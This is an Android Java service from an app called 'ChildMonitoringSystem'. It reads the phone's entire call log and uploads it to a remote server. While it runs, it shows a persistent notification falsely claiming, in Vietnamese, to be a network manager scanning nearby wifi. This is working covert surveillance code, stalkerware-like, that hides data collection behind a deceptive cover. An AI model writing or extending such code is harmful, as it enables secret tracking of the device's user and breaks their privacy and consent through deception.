package com.ChildMonitoringSystem.CMS.JobService;

import static com.ChildMonitoringSystem.CMS.MyApplication.CHANNEL_ID;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.ChildMonitoringSystem.CMS.BroadCast.Restarter_Service;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadCallLogFromDevice;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadContactFromDevice;
import com.ChildMonitoringSystem.CMS.Model.INFO_CALL_LOG;
import com.ChildMonitoringSystem.CMS.Model.INFO_PHONEBOOK;
import com.ChildMonitoringSystem.CMS.R;
import com.ChildMonitoringSystem.CMS.Value.Constant;

import java.util.ArrayList;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class UploadCallLogDataService extends Service {
    private ArrayList<INFO_CALL_LOG> list;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());
        try {
            LoadCallLogFromDevice loadCallLogFromDevice = new LoadCallLogFromDevice();
            list = loadCallLogFromDevice.LoadAllCallLog(getApplicationContext());
        } catch (Exception e) {
            e.printStackTrace();
        }


    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground() {
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Trình quản lí mạng")
                .setContentText("Hệ thống đang quét wifi gần bạn")
                .setSmallIcon(R.drawable.ic_baseline_settings_24)
                .setShowWhen(false)
                .build();
        startForeground(2, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        Log.i("TAG", "Upload data");
        SendCallLOgtoServer(list);
        return START_NOT_STICKY;
    }

    private void SendCallLOgtoServer(ArrayList<INFO_CALL_LOG> info_call_logs) {
        if (info_call_logs.size() > 0) {
            com.ChildMonitoringSystem.CMS.Service.Service.apiservice.sendCallLog(info_call_logs).enqueue(new Callback<ArrayList<INFO_CALL_LOG>>() {
                @Override
                public void onResponse(Call<ArrayList<INFO_CALL_LOG>> call, Response<ArrayList<INFO_CALL_LOG>> response) {
                    Log.i("TAG", "onResponse: send done" + response.body());
                    stopSelf();
                }

                @Override
                public void onFailure(Call<ArrayList<INFO_CALL_LOG>> call, Throwable t) {
                    Log.i("TAG", "onResponse: send failed");
                }
            });


        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
